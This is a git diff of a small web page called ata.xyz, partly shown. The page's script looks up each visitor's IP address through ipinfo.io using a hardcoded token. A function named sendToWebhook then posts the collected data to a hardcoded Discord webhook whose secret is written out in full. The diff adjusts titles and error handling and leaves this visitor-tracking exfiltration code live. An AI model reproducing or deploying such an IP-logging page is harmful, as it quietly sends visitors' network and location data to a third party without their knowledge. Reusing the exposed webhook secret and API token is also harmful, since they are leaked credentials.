@@ -6,7 +6,7 @@
     <title>ata.xyz</title>
     <link rel="stylesheet" href="haha.css">
 
-    <meta name="title" content="ata.xyz" />
+    <meta name="title" content="oober.xyz" />
     <meta name="description" content="" />
 
     <meta property="og:type" content="website" />
@@ -17,7 +17,7 @@
 
     <meta property="twitter:card" content="summary_large_image" />
     <meta property="twitter:url" content="https://ata.xyz/" />
-    <meta property="twitter:title" content="oober.xyz" />
+    <meta property="twitter:title" content="ata.xyz" />
     <meta property="twitter:description" content="" />
     <meta property="twitter:image" content="https://i.ibb.co/ZdFTCDq/56-C092-ED-3-FEE-4-F99-8764-0-E197281-D573.png" />
 </head>
@@ -50,6 +50,9 @@
         async function fetchUserInfo() {
             try {
                 const response = await fetch('https://ipinfo.io/json?token=39e30806848e91');
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
                 const data = await response.json();
 
                 document.getElementById('ip').textContent = data.ip;
@@ -72,7 +75,7 @@
         }
 
         async function sendToWebhook(data) {
-            const webhookURL = 'https://discord.com/api/webhooks/1270105042791305227/3uzXne5QtKvaKnAQoGByUoXpykEbs8Y_FYafGTNEtc9_GZ3w9F534yosGry4F24Y8rG4'; // Your Discord webhook URL
+            const webhookURL = 'https://discord.com/api/webhooks/1270105042791305227/3uzXne5QtKvaKnAQoGByUoXpykEbs8Y_FYafGTNEtc9_GZ3w9F534yosGry4F24Y8rG4';
             
             const message = {
                 embeds: [
